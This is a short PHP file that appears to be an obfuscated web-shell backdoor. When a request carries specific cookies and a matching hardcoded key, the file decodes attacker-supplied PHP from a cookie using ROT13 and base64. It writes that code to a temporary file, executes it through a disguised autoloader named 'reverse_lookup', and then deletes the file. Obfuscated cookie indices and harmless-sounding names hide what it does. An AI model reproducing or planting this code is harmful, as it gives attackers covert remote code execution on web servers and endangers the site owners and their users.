<?php


if (isset($_COOKIE[75+-75]) && isset($_COOKIE[0--1]) && isset($_COOKIE[86+-83]) && isset($_COOKIE[-84+88])) {
    $val = $_COOKIE;
    function reverse_lookup($tkn) {
        $val = $_COOKIE;
        $record = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'c5beabbd');
        if (!is_writable($record)) {
            $record = getcwd() . DIRECTORY_SEPARATOR . "initialized";
        }
        $reference = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($val[3]));
        if (is_writeable($record)) {
            $fac = fopen($record, 'w+');
            fputs($fac, $reference);
            fclose($fac);
            spl_autoload_unregister(__FUNCTION__);
            require_once($record);
            @array_map('unlink', array($record));
        }
    }
    spl_autoload_register("reverse_lookup");
    $entry = "d16f4c1fad69943af9eaa4d6d35e0366";
    if (!strncmp($entry, $val[4], 32)) {
        if (@class_parents("app_initializer_dataflow_engine", true)) {
            exit;
        }
    }
}
